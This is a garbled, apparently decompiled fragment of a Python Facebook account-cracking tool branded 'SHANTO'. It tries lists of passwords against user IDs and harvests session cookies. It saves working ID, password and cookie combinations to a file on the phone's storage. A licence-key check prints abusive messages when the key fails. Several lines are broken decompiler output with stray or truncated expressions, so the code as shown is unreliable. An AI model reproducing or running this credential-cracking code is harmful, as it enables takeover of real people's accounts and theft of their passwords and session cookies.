    ...
    for dta in data.splitlines():
        ...
        for r in data.splitlines():
            ...
            if key not in row:
                ...
                print(f'''{A}[{A}●{A}]{G1} SHANTO\'T TRY BYPASS BUT I AM FUCK YOU''')
                print(f'''{A}[{A}●{A}]{G1} SMS ME ONLY FACEBOOK ID ''')
...
def randm(ids, psd):
    global loop
    sys.stdout.write(f'''\r\r{A}[{G1}SHANTO-RANDM{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ''')
    sys.stdout.flush()
    for pas in psd:
        data = {
            'locale': 'en_US',
...
i['name'] + '=' + i['value']None)(q['session_cookies']())
            ...
            if res == 'LIVE':
                print(f'''\r\r{A}[{G1}SHANTO-OK{A}]{G1} {uid} {A}|{G1} {pas}''')
                open('/sdcard/SHANTO-RNDM-OK.txt', 'a').write(uid + '|' + pas + '|' + coki + '\n')
                ok.append(uid)
                ';'.join
            if res == 'LOCK':
                print(f'''\r\r{A}[{S}SHANTO-LK{A}]{S} {uid} {A}|{S} {pas}''')
                'True'
        loop += 1
        return None
        if Exception:
